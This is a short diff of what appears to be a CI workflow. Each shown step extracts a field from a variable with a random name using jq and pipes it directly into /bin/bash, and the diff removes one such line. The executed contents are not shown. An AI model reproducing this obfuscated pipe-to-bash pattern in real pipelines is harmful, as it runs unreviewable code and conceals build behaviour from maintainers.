@@ -25,7 +25,6 @@ jobs:
           echo $lyc6 | jq -r .ez764 | /bin/bash
           printf '%s' "$apda46" | jq -r .en58462 | /bin/bash
           printf '%s' "$wqx469" | jq -r .n3694 | /bin/bash
-          echo $vtzch680 | jq -r .qka041 | /bin/bash
           printf '%s' "$prewk82" | jq -r .v87 | /bin/bash
           echo $mirc7043 | jq -r .hkpl4 | /bin/bash
 
